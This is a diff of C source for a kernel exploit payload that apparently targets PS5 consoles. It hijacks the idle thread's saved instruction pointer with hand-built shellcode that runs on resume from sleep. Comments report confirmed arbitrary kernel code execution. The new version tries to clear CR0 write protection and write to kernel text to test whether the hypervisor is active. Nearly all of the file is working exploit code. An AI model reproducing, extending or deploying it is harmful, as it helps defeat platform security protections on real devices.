@@ -1,41 +1,33 @@
 #include <stdint.h>
 
 /*
- * pcb_overwrite v2 — Hijack idle PCB with trampoline → sw_return
+ * pcb_overwrite v3 — HV probe via idle PCB hijack
  *
- * === CONFIRMED WORKING 2026-03-07 ===
- *   Phase 1 (fw_ver=0x403): Armed trampoline, overwrote pcb_rip ✓
- *   Suspend/resume: Console entered rest mode and resumed cleanly ✓
- *   Phase 2 (fw_ver=0x2): Sentinel 0x484A4B5F52414E21 ("HJK_RAN!") found ✓
- *   pcb_rip restored to sw_return by cpu_switch after trampoline ran ✓
- *   VERDICT: FULL SUCCESS — arbitrary kernel code execution via PCB hijack
+ * === v2 CONFIRMED WORKING 2026-03-07 ===
+ *   Trampoline executed on resume, wrote sentinel, jumped to sw_return.
+ *   Kernel resumed cleanly. Arbitrary code execution via PCB hijack proven.
  *
- * v1 LEARNED:
- *   - PCB overwrite succeeds (pcb_rip readback confirmed)
- *   - But nop_ret (bare `ret` gadget) skips sw_return cleanup → kernel panic
- *   - sw_return has critical cleanup (lock release, CR3 restore, etc.)
+ * v3 GOAL — PROBE HYPERVISOR STATE DURING RESUME:
+ *   The hypothesis (from PS5 security research): during suspend/resume,
+ *   code that runs early enough in the resume path executes BEFORE the
+ *   hypervisor restarts. In this window:
+ *     - CR0.WP can be cleared (HV normally intercepts this)
+ *     - Ktext is writable (HV's NPT normally blocks this)
+ *     - Kernel patches can be applied before HV re-establishes protections
  *
- * v2 APPROACH — TRAMPOLINE:
- *   Instead of jumping to a bare `ret`, jump to a trampoline that:
- *     1. Writes a sentinel to kdata (proof we ran)
- *     2. Jumps to sw_return (lets kernel handle its own cleanup)
+ *   v3 tests this by having the resume trampoline:
+ *     1. Write HJK_RAN! sentinel (proof of execution, same as v2)
+ *     2. Snapshot CR0, CR4, EFER
+ *     3. Attempt to clear CR0.WP
+ *     4. If WP cleared: attempt to write 8 bytes to ktext, verify, restore
+ *     5. Record all results to kdata for phase 2 verification
  *
- *   The trampoline is written into the exec_code buffer (malloc'd, NX-cleared
- *   by kldload). This memory persists across suspend/resume and is executable.
- *
- *   Trampoline shellcode (35 bytes):
- *     movabs rax, SENTINEL_VALUE    ; 48 B8 <8 bytes>
- *     movabs rcx, SENTINEL_ADDR    ; 48 B9 <8 bytes>
- *     mov    [rcx], rax            ; 48 89 01
- *     movabs rax, SW_RETURN_ADDR   ; 48 B8 <8 bytes>
- *     jmp    rax                   ; FF E0
- *
- *   Only clobbers rax (was just jmp target) and rcx (scratch, not in PCB).
- *   rsp and all callee-saved regs are preserved for sw_return.
+ *   The trampoline is a small asm stub that calls a compiled C function
+ *   (hv_probe), then jumps to sw_return for clean kernel resumption.
  *
  * PHASES:
- *   fw_ver=0x403: Phase 1 — Build trampoline, overwrite pcb_rip, arm
- *   fw_ver=0x2:   Phase 2 — Verify post-resume: check sentinels + PCB
+ *   fw_ver=0x403: Phase 1 — Build HV probe trampoline, overwrite pcb_rip
+ *   fw_ver=0x2:   Phase 2 — Verify post-resume: sentinels + HV probe results
  *   fw_ver=0x3:   Phase 1 DRY RUN — snapshot only, NO writes
  *
  * Output layout — Phase 1 (ARM):
@@ -48,10 +40,11 @@
  *   [4]   pcpu0
  *   [5]   idlethread
  *   [6]   idle_pcb
- *   [7]   trampoline address (or nop_ret for dry run)
+ *   [7]   stub address (trampoline entry point)
  *   [8]   original pcb_rip (sw_return)
  *   [9]   original pcb_rsp
  *   [10]  exec_code base
+ *   [11]  hv_probe function address
  *
  *   --- idle PCB snapshot (8 key fields) ---
  *   [12]  pcb_r15
@@ -66,11 +59,15 @@
  *   --- pcb_rip overwrite ---
  *   [20]  pcb_rip BEFORE overwrite
  *   [21]  pcb_rip AFTER overwrite (readback)
- *   [22]  overwrite target (trampoline addr)
+ *   [22]  overwrite target (stub addr)
  *
- *   --- kdata sentinel ---
+ *   --- metadata ---
  *   [24]  sentinel address (kdata+0x400)
- *   [25]  sentinel value (pre-written 0, trampoline will write real one)
+ *   [25]  0 (sentinel not yet set)
+ *   [26]  sw_return address
+ *   [27]  stub size (bytes)
+ *   [28]  ktext probe address
+ *   [29]  hv_probe function address
  *
  *   [30]  sentinel 0xdeadbeefcafe00BB
  *
@@ -94,7 +91,7 @@
  *   [14]  pcb_rbp
  *   [15]  pcb_rsp
  *   [16]  pcb_rbx
- *   [17]  pcb_rip  (*** did cpu_switch update this? ***)
+ *   [17]  pcb_rip
  *
  *   --- kdata persistence checks ---
  *   [20]  kdata+0x400 sentinel (should be HIJACK_SENTINEL if trampoline ran!)
@@ -104,9 +101,24 @@
  *   [24]  pre-overwrite pcb_rip (from kdata+0x410 backup)
  *   [25]  current pcb_rip
  *   [26]  sw_return address (computed)
- *   [27]  1 if pcb_rip restored to sw_return → HIJACK CONFIRMED
- *         2 if pcb_rip is still trampoline → trampoline persisted but didn't run
- *         3 if pcb_rip is something else
+ *   [27]  verdict:
+ *         1 = FULL SUCCESS: sentinel + pcb_rip restored
+ *         2 = pcb_rip restored but sentinel missing
+ *         3 = trampoline addr still in pcb_rip
+ *         4 = unexpected pcb_rip value
+ *
+ *   --- HV probe results (v3) ---
+ *   [32]  CR0 before WP clear attempt
+ *   [33]  CR4
+ *   [34]  CR0 after WP clear attempt
+ *   [35]  ktext probe address
+ *   [36]  ktext original value (8 bytes read before write)
+ *   [37]  ktext readback value (8 bytes read after write attempt)
+ *   [38]  HV result code:
+ *         1 = WP cleared + ktext writable → NO HV (full success!)
+ *         2 = WP stuck → HV active (intercepting CR0 writes)
+ *         3 = WP cleared but ktext write failed → NPT still active?
+ *   [39]  EFER MSR value
  *
  *   [30]  sentinel 0xdeadbeefcafe00CC
  */
@@ -134,9 +146,25 @@
 #define PCB_RIP          0x38
 
 /* kdata persistence locations */
-#define KDATA_SENT_OFF   0x400   /* sentinel — trampoline writes here on resume */
-#define KDATA_BACKUP_OFF 0x410   /* backup of original pcb_rip */
+#define KDATA_SENT_OFF       0x400   /* sentinel — trampoline writes here */
+#define KDATA_BACKUP_OFF     0x410   /* backup of original pcb_rip + stub addr */
 
+/* v3 HV probe result locations in kdata */
+#define KDATA_CR0_BEFORE     0x420
+#define KDATA_CR4_VAL        0x428
+#define KDATA_CR0_AFTER_WP   0x430
+#define KDATA_KTEXT_PROBE    0x438
+#define KDATA_KTEXT_ORIG     0x440
+#define KDATA_KTEXT_READBACK 0x448
+#define KDATA_HV_RESULT      0x450
+#define KDATA_EFER_VAL       0x458
+
+/* HV probe result codes */
+#define HV_WP_CLEARED_KTEXT_RW    1  /* WP cleared AND ktext writable → NO HV */
+#define HV_WP_STUCK               2  /* CR0.WP stuck → HV intercepting */
+#define HV_WP_CLEARED_KTEXT_RO    3  /* WP cleared but ktext write failed */
+
+#define CR0_WP  (1ULL << 16)
 #define MIN_KERN_ADDR    0xFFFF800000000000ULL
 
 typedef struct {
@@ -153,6 +181,25 @@ static inline uint64_t rdmsr(uint32_t msr)
     return ((uint64_t)hi << 32) | lo;
 }
 
+static inline uint64_t readcr0(void)
+{
+    uint64_t v;
+    __asm__ volatile("mov %%cr0, %0" : "=r"(v));
+    return v;
+}
+
+static inline void writecr0(uint64_t v)
+{
+    __asm__ volatile("mov %0, %%cr0" :: "r"(v) : "memory");
+}
+
+static inline uint64_t readcr4(void)
+{
+    uint64_t v;
+    __asm__ volatile("mov %%cr4, %0" : "=r"(v));
+    return v;
+}
+
 static inline uint64_t read8(uint64_t addr)
 {
     return *(volatile uint64_t*)addr;
@@ -164,31 +211,133 @@ static inline void write8(uint64_t addr, uint64_t val)
 }
 
 /*
- * Build trampoline shellcode at `dest`:
- *   movabs rax, sentinel_val     ; 48 B8 <8>
- *   movabs rcx, sentinel_addr   ; 48 B9 <8>
- *   mov    [rcx], rax           ; 48 89 01
- *   movabs rax, sw_return_addr  ; 48 B8 <8>
- *   jmp    rax                  ; FF E0
+ * HV probe function — called from trampoline stub during resume.
+ * Runs at ring 0 in cpu_switch context on the BSP.
  *
- * Total: 35 bytes. Returns trampoline size.
+ * Tests whether the hypervisor is active by:
+ * 1. Attempting to clear CR0.WP (HV intercepts this when active)
+ * 2. If WP cleared, attempting to write to ktext (NPT blocks when active)
+ *
+ * During resume, if the HV hasn't restarted yet:
+ *   - No VMCB is loaded, no SVM intercepts active
+ *   - CR0 writes execute natively (WP can be cleared)
+ *   - No nested page tables → only guest PTEs matter
+ *   - With WP=0, supervisor writes bypass PTE R/W checks
+ *   - Ktext IS writable
+ *
+ * All results stored to kdata+0x420..0x458.
  */
-static int build_trampoline(uint64_t dest, uint64_t sentinel_addr,
-                            uint64_t sentinel_val, uint64_t sw_return_addr)
+static void __attribute__((noinline, used))
+hv_probe(uint64_t kdata_base, uint64_t ktext_probe_addr)
+{
+    /* 1. Write sentinel — proof we ran (same as v2) */
+    write8(kdata_base + KDATA_SENT_OFF, HIJACK_SENTINEL);
+
+    /* 2. Snapshot control registers */
+    uint64_t cr0 = readcr0();
+    uint64_t cr4 = readcr4();
+    uint64_t efer = rdmsr(0xC0000080);  /* IA32_EFER */
+
+    write8(kdata_base + KDATA_CR0_BEFORE, cr0);
+    write8(kdata_base + KDATA_CR4_VAL, cr4);
+    write8(kdata_base + KDATA_EFER_VAL, efer);
+    write8(kdata_base + KDATA_KTEXT_PROBE, ktext_probe_addr);
+
+    /* 3. Try to clear CR0.WP
+     *
+     * If HV is active: this triggers a VMEXIT. The HV's CR0 write handler
+     * silently keeps WP=1 and returns. No crash — just blocked.
+     *
+     * If HV is NOT active: the write executes natively. WP is cleared.
+     */
+    writecr0(cr0 & ~CR0_WP);
+
+    /* Read back to see if WP actually cleared */
+    uint64_t cr0_after = readcr0();
+    write8(kdata_base + KDATA_CR0_AFTER_WP, cr0_after);
+
+    if (cr0_after & CR0_WP) {
+        /* WP still set → HV intercepted the CR0 write */
+        write8(kdata_base + KDATA_HV_RESULT, HV_WP_STUCK);
+        write8(kdata_base + KDATA_KTEXT_ORIG, 0);
+        write8(kdata_base + KDATA_KTEXT_READBACK, 0);
+        /* CR0 unchanged, no need to restore */
+        return;
+    }
+
+    /*
+     * WP CLEARED — HV is NOT intercepting CR0 writes!
+     * This strongly suggests the HV hasn't started yet.
+     * NPT should be inactive, so ktext writes should succeed.
+     */
+
+    /* 4. Read original ktext value */
+    uint64_t orig = read8(ktext_probe_addr);
+    write8(kdata_base + KDATA_KTEXT_ORIG, orig);
+
+    /* 5. Try to write to ktext (flip LSB — minimal change) */
+    uint64_t test_val = orig ^ 1;
+    write8(ktext_probe_addr, test_val);
+
+    /* 6. Read back to verify write took effect */
+    uint64_t readback = read8(ktext_probe_addr);
+    write8(kdata_base + KDATA_KTEXT_READBACK, readback);
+
+    if (readback == test_val) {
+        /* SUCCESS — ktext is writable! HV is NOT active! */
+        write8(kdata_base + KDATA_HV_RESULT, HV_WP_CLEARED_KTEXT_RW);
+        /* Restore original ktext value immediately */
+        write8(ktext_probe_addr, orig);
+    } else {
+        /* WP cleared but ktext write didn't stick — NPT still active? */
+        write8(kdata_base + KDATA_HV_RESULT, HV_WP_CLEARED_KTEXT_RO);
+    }
+
+    /* 7. Restore CR0 (re-enable WP) */
+    writecr0(cr0);
+}
+
+/*
+ * Build trampoline stub that calls hv_probe() then jumps to sw_return.
+ *
+ * Shellcode:
+ *   movabs rdi, kdata_base         ; 10 bytes  (arg 1)
+ *   movabs rsi, ktext_probe_addr   ; 10 bytes  (arg 2)
+ *   movabs rax, hv_probe_addr      ; 10 bytes
+ *   call   rax                     ; 2 bytes   (FF D0)
+ *   movabs rax, sw_return_addr     ; 10 bytes
+ *   jmp    rax                     ; 2 bytes   (FF E0)
+ *
+ * Total: 44 bytes.
+ *
+ * Register safety:
+ *   - rdi, rsi, rax: clobbered (caller-saved, not in PCB)
+ *   - hv_probe() is a normal C function: preserves rbx, rbp, r12-r15
+ *   - rsp: balanced by call/ret pair
+ *   - After stub returns to sw_return: all PCB regs intact
+ */
+static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
+                                uint64_t ktext_probe_addr,
+                                uint64_t hv_probe_addr,
+                                uint64_t sw_return_addr)
 {
     volatile uint8_t* p = (volatile uint8_t*)dest;
     int i = 0;
 
-    /* movabs rax, sentinel_val */
+    /* movabs rdi, kdata_base */
+    p[i++] = 0x48; p[i++] = 0xBF;
+    for (int b = 0; b < 8; b++) p[i++] = (kdata_base >> (b * 8)) & 0xFF;
+
+    /* movabs rsi, ktext_probe_addr */
+    p[i++] = 0x48; p[i++] = 0xBE;
+    for (int b = 0; b < 8; b++) p[i++] = (ktext_probe_addr >> (b * 8)) & 0xFF;
+
+    /* movabs rax, hv_probe_addr */
     p[i++] = 0x48; p[i++] = 0xB8;
-    for (int b = 0; b < 8; b++) p[i++] = (sentinel_val >> (b * 8)) & 0xFF;
+    for (int b = 0; b < 8; b++) p[i++] = (hv_probe_addr >> (b * 8)) & 0xFF;
 
-    /* movabs rcx, sentinel_addr */
-    p[i++] = 0x48; p[i++] = 0xB9;
-    for (int b = 0; b < 8; b++) p[i++] = (sentinel_addr >> (b * 8)) & 0xFF;
-
-    /* mov [rcx], rax */
-    p[i++] = 0x48; p[i++] = 0x89; p[i++] = 0x01;
+    /* call rax */
+    p[i++] = 0xFF; p[i++] = 0xD0;
 
     /* movabs rax, sw_return_addr */
     p[i++] = 0x48; p[i++] = 0xB8;
@@ -197,7 +346,7 @@ static int build_trampoline(uint64_t dest, uint64_t sentinel_addr,
     /* jmp rax */
     p[i++] = 0xFF; p[i++] = 0xE0;
 
-    return i;  /* 35 */
+    return i;  /* 44 */
 }
 
 static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
@@ -211,10 +360,15 @@ static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
     uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
     uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);
 
-    /* Trampoline location: right after payload code in exec_code buffer */
-    uint64_t trampoline_addr = exec_code + data_size;
-    /* Align to 16 bytes for good measure */
-    trampoline_addr = (trampoline_addr + 15) & ~15ULL;
+    /* Stub location: right after payload code in exec_code buffer */
+    uint64_t stub_addr = exec_code + data_size;
+    stub_addr = (stub_addr + 15) & ~15ULL;
+
+    /* ktext probe address: use sw_return (known ktext addr with known content) */
+    uint64_t ktext_probe_addr = sw_return;
+
+    /* hv_probe function address (PIE: lea-based, correct at runtime) */
+    uint64_t probe_fn_addr = (uint64_t)hv_probe;
 
     /* Header */
     out32[0] = MAGIC_PCBO;
@@ -232,7 +386,7 @@ static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
         idle_pcb = read8(idlethread + TD_PCB);
 
     out[6] = idle_pcb;
-    out[7] = trampoline_addr;
+    out[7] = stub_addr;
 
     if (idle_pcb < MIN_KERN_ADDR) {
         out32[1] = 0xFE;  /* error: invalid idle_pcb */
@@ -247,6 +401,7 @@ static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
     out[8]  = orig_rip;
     out[9]  = orig_rsp;
     out[10] = exec_code;
+    out[11] = probe_fn_addr;
 
     /* Snapshot 8 key PCB fields */
     out[12] = read8(idle_pcb + PCB_R15);
@@ -272,39 +427,43 @@ static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
             return;
         }
 
-        /* Build trampoline shellcode in exec_code buffer */
-        uint64_t sentinel_addr = kdata_base + KDATA_SENT_OFF;
-        int tsize = build_trampoline(trampoline_addr, sentinel_addr,
-                                     HIJACK_SENTINEL, sw_return);
+        /* Build HV probe stub in exec_code buffer */
+        int ssize = build_hv_probe_stub(stub_addr, kdata_base,
+                                         ktext_probe_addr,
+                                         probe_fn_addr, sw_return);
 
         /* Backup original pcb_rip to kdata */
         write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
-        write8(kdata_base + KDATA_BACKUP_OFF + 8, trampoline_addr);
+        write8(kdata_base + KDATA_BACKUP_OFF + 8, stub_addr);
 
-        /* Clear kdata sentinel (trampoline will set it on resume) */
-        write8(sentinel_addr, 0);
+        /* Clear sentinel and all HV probe result slots */
+        write8(kdata_base + KDATA_SENT_OFF, 0);
+        for (int off = KDATA_CR0_BEFORE; off <= KDATA_EFER_VAL; off += 8)
+            write8(kdata_base + off, 0);
 
         /* === THE OVERWRITE === */
-        write8(idle_pcb + PCB_RIP, trampoline_addr);
+        write8(idle_pcb + PCB_RIP, stub_addr);
 
         /* Readback to confirm */
         out[21] = read8(idle_pcb + PCB_RIP);
-        out[22] = trampoline_addr;
+        out[22] = stub_addr;
 
-        out[24] = sentinel_addr;
-        out[25] = 0;  /* sentinel not yet set — trampoline sets it on resume */
-
-        /* Report trampoline details */
+        out[24] = kdata_base + KDATA_SENT_OFF;
+        out[25] = 0;  /* sentinel not yet set */
         out[26] = sw_return;
-        out[27] = (uint64_t)tsize;
+        out[27] = (uint64_t)ssize;
+        out[28] = ktext_probe_addr;
+        out[29] = probe_fn_addr;
     } else {
         /* DRY RUN: snapshot only */
         out[21] = orig_rip;
-        out[22] = trampoline_addr;
+        out[22] = stub_addr;
         out[24] = kdata_base + KDATA_SENT_OFF;
         out[25] = 0;
         out[26] = kdata_base + SW_RETURN_OFF;
         out[27] = 0;
+        out[28] = ktext_probe_addr;
+        out[29] = probe_fn_addr;
     }
 
     out[30] = 0xdeadbeefcafe00BBULL;
@@ -362,7 +521,7 @@ static void phase2_verify(uint64_t kdata_base, volatile uint64_t* out,
 
     /* pcb_rip analysis */
     uint64_t backed_up_rip = read8(kdata_base + KDATA_BACKUP_OFF);
-    uint64_t trampoline_addr = read8(kdata_base + KDATA_BACKUP_OFF + 8);
+    uint64_t stub_addr = read8(kdata_base + KDATA_BACKUP_OFF + 8);
     uint64_t current_rip = read8(idle_pcb + PCB_RIP);
 
     out[24] = backed_up_rip;    /* original sw_return (saved in phase 1) */
@@ -370,28 +529,31 @@ static void phase2_verify(uint64_t kdata_base, volatile uint64_t* out,
     out[26] = sw_return;        /* computed sw_return this boot */
 
     /*
-     * Analysis:
+     * Verdict:
      * 1 = pcb_rip restored to sw_return AND sentinel == HIJACK_SENTINEL
-     *     → FULL SUCCESS: trampoline ran, wrote sentinel, jumped to sw_return,
-     *       kernel continued normally, cpu_switch re-saved sw_return into PCB
-     *
-     * 2 = pcb_rip restored to sw_return but sentinel != HIJACK_SENTINEL
-     *     → Partial: cpu_switch ran but trampoline didn't write sentinel?
-     *
-     * 3 = pcb_rip still == trampoline_addr
-     *     → Trampoline persisted but cpu_switch hasn't run with this PCB yet
-     *
-     * 4 = pcb_rip is something else
-     *     → Unexpected
+     *     → FULL SUCCESS: trampoline ran, wrote sentinel, jumped to sw_return
+     * 2 = pcb_rip restored but sentinel missing
+     * 3 = pcb_rip still == stub_addr (trampoline hasn't run yet)
+     * 4 = unexpected pcb_rip
      */
     if (current_rip == sw_return && sentinel == HIJACK_SENTINEL)
-        out[27] = 1;  /* FULL SUCCESS */
+        out[27] = 1;
     else if (current_rip == sw_return)
-        out[27] = 2;  /* sw_return restored but sentinel missing */
-    else if (current_rip == trampoline_addr)
-        out[27] = 3;  /* trampoline still in PCB */
+        out[27] = 2;
+    else if (current_rip == stub_addr)
+        out[27] = 3;
     else
-        out[27] = 4;  /* something else */
+        out[27] = 4;
+
+    /* v3: Read HV probe results from kdata */
+    out[32] = read8(kdata_base + KDATA_CR0_BEFORE);
+    out[33] = read8(kdata_base + KDATA_CR4_VAL);
+    out[34] = read8(kdata_base + KDATA_CR0_AFTER_WP);
+    out[35] = read8(kdata_base + KDATA_KTEXT_PROBE);
+    out[36] = read8(kdata_base + KDATA_KTEXT_ORIG);
+    out[37] = read8(kdata_base + KDATA_KTEXT_READBACK);
+    out[38] = read8(kdata_base + KDATA_HV_RESULT);
+    out[39] = read8(kdata_base + KDATA_EFER_VAL);
 
     out[30] = 0xdeadbeefcafe00CCULL;
     out32[1] = 0x0001;
